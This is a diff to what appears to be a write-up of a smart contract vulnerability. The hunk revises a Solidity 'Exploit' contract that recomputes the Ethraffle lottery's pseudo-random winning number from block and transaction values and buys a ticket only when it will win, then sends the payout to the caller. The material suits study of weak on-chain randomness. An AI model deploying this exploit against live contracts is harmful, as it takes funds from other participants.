@@ -44,28 +44,34 @@ After all tickets in a round(50 ticket for a round) was sold, `chooseWinner()` r
 Exploit
 ------
     contract Exploit{
-    
+
         Ethraffle target;
-        
+    
         uint constant totalTickets = 6;
-        
+    
         function Exploit(address _target) public payable{
             target = Ethraffle(_target);
         }
-    
+
         function attack(uint256 _amount) public payable{
-        
-            uint current_sold = target.nextTicket;
+    
+            uint current_sold = target.nextTicket();
             if(current_sold + 1 > totalTickets){
-                bytes32 sha = sha3(block.coinbase, this.address, msg.gas, tx.gasprice);
+                bytes32 sha = sha3(block.coinbase, this, msg.gas, tx.gasprice);
                 uint winningNumber = (uint(sha) % totalTickets) + 1;
-                
+            
                 if(winningNumber == totalTickets){          //if we will win
                     target.buyTickets.value(_amount)();
                     msg.sender.transfer(this.balance);
                 }
 
             }
-            
+        
         }
+    }
+
+    contract Ethraffle
+    {
+        function buyTickets() payable public;
+        uint public nextTicket;
     }
